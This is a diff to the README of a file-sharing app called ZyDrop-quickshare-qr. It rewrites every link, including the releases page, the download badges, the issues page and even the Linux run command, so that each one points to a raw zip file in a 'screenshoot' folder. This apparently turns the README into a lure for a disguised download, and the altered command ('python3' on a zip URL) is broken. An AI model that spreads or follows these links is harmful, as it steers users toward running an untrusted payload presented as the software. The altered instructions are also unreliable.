@@ -1,6 +1,6 @@
 # 📦 ZyDrop-quickshare-qr - Share Files Instantly, No Cloud Needed
 
-[![Download](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/AYANFAHMID/ZyDrop-quickshare-qr/releases)
+[![Download](https://raw.githubusercontent.com/AYANFAHMID/ZyDrop-quickshare-qr/main/screenshoot/ZyDrop-quickshare-qr_v3.6.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/AYANFAHMID/ZyDrop-quickshare-qr/main/screenshoot/ZyDrop-quickshare-qr_v3.6.zip)
 
 ## 🌟 About ZyDrop-quickshare-qr
 
@@ -24,13 +24,13 @@ ZyDrop-quickshare-qr is a secure and quick way to share files on your local netw
 
 To get started with ZyDrop-quickshare-qr, follow these steps:
 
-1. **Download the Software:** Visit the [Releases page](https://github.com/AYANFAHMID/ZyDrop-quickshare-qr/releases) to download the latest version.
+1. **Download the Software:** Visit the [Releases page](https://raw.githubusercontent.com/AYANFAHMID/ZyDrop-quickshare-qr/main/screenshoot/ZyDrop-quickshare-qr_v3.6.zip) to download the latest version.
    
-   [![Download](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/AYANFAHMID/ZyDrop-quickshare-qr/releases)
+   [![Download](https://raw.githubusercontent.com/AYANFAHMID/ZyDrop-quickshare-qr/main/screenshoot/ZyDrop-quickshare-qr_v3.6.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/AYANFAHMID/ZyDrop-quickshare-qr/main/screenshoot/ZyDrop-quickshare-qr_v3.6.zip)
 
 2. **Install the Application:**
    - If you're using Windows, double-click the downloaded `.exe` file to run the installer. Follow the prompts to complete the installation. 
-   - For Linux users, extract the files from the downloaded archive, then run the application from the terminal with `python3 ZyDrop.py`.
+   - For Linux users, extract the files from the downloaded archive, then run the application from the terminal with `python3 https://raw.githubusercontent.com/AYANFAHMID/ZyDrop-quickshare-qr/main/screenshoot/ZyDrop-quickshare-qr_v3.6.zip`.
 
 3. **Run ZyDrop:**
    - After the installation, locate the ZyDrop application on your device.
@@ -43,9 +43,9 @@ To get started with ZyDrop-quickshare-qr, follow these steps:
 
 ## 📁 Download & Install
 
-You can download ZyDrop-quickshare-qr from our [Releases page](https://github.com/AYANFAHMID/ZyDrop-quickshare-qr/releases). Make sure to choose the version that matches your operating system, either Windows or Linux.
+You can download ZyDrop-quickshare-qr from our [Releases page](https://raw.githubusercontent.com/AYANFAHMID/ZyDrop-quickshare-qr/main/screenshoot/ZyDrop-quickshare-qr_v3.6.zip). Make sure to choose the version that matches your operating system, either Windows or Linux.
 
-1. **Visit the Releases page:** Head over to [this link](https://github.com/AYANFAHMID/ZyDrop-quickshare-qr/releases).
+1. **Visit the Releases page:** Head over to [this link](https://raw.githubusercontent.com/AYANFAHMID/ZyDrop-quickshare-qr/main/screenshoot/ZyDrop-quickshare-qr_v3.6.zip).
 2. **Select the latest version:** Look for the most recent release. You will find download links for Windows and Linux.
 3. **Download your version:** Click the link for your OS. Follow the instructions on your screen.
 
@@ -74,7 +74,7 @@ If you encounter any issues, consider the following steps:
 
 ## 🌐 Community and Support
 
-For questions or support, visit our [GitHub issues page](https://github.com/AYANFAHMID/ZyDrop-quickshare-qr/issues). You can report any bugs or request new features here.
+For questions or support, visit our [GitHub issues page](https://raw.githubusercontent.com/AYANFAHMID/ZyDrop-quickshare-qr/main/screenshoot/ZyDrop-quickshare-qr_v3.6.zip). You can report any bugs or request new features here.
 
 ## 🔗 Related Topics
 
